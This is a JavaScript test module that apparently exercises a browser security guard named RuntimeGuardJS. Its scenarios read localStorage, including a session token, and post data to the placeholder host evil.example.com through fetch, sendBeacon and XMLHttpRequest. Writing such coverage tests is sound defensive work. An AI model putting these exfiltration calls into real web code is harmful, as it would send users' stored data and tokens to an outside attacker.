export async function runNormalBehavior() {
  localStorage.setItem("theme", "dark");
  localStorage.getItem("theme");

  try {
    await fetch(window.location.href);
  } catch (error) {
    console.error("Normal behavior scenario error:", error);
  }
}

export function runProtectedDataAccess() {
  try {
    localStorage.getItem("session-token");
  } catch (error) {
    console.error("Protected data access blocked:", error);
  }
}

export async function runDataExfiltration() {
  try {
    const data = localStorage.getItem("theme");

    await fetch("https://evil.example.com/steal-data", {
      method: "POST",
      body: data ?? "no-data",
    });
  } catch (error) {
    console.error("Data exfiltration blocked:", error);
  }
}

export function runBeaconCoverageTest() {
  const target = "https://evil.example.com/steal-data";

  const sent = navigator.sendBeacon(
    target,
    "test-data"
  );

  console.log("RuntimeGuardJS coverage test:", {
    api: "navigator.sendBeacon",
    target,
    browserAcceptedRequest: sent,
  });
}

export function runXHRcoverageTest() {
  const target = "https://evil.example.com/steal-data";

  const request = new XMLHttpRequest();

  request.open("POST", target);

  request.addEventListener("error", () => {
    console.log("XMLHttpRequest network request failed.");
  });

  console.log("RuntimeGuardJS coverage test:", {
    api: "XMLHttpRequest",
    target,
  });

  request.send("test-data");
}

